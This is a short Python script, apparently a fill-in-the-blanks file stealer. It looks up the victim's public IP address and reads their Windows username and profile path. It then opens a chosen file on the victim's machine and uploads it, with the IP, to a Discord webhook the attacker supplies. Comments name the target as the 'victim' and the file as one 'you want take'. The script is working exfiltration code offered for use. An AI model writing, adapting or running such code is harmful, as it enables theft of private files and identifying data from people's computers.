#import libraries
from discord_webhook import DiscordWebhook
import requests
import os

username = os.environ["USERNAME"] #username of pc (you can use in file variabiles)
userprofile = os.environ["USERPROFILE"] #path file > C:\Users\{username} (you can use in file variabiles)

i = requests.get("https://ifconfig.me") #get victim public ip
weburl = 'ENTER HERE YOUR WEBHOOK' #enter here your discord webhook url
file = 'ENTER HERE YOUR FILE PATH' #enter here the file path of file that you want take
name = 'ENTER HERE THE NAME YOU WANT THE FILE SENT TO DISCORD TO HAVE' #enter here the name of the sent file
message = 'INSERT HERE THE MESSAGE THAT WILL BE SENT IN DISCORD' #enter here the message embed

#create function
def send():
    webhook = DiscordWebhook(url=weburl, content=message + " from public ip " + i.text) #message that will send by webhook
    with open(file, "rb") as f: #open file
        webhook.add_file(file=f.read(), filename=name) #add the file to message
    webhook.execute() #execute all

send() #call the function
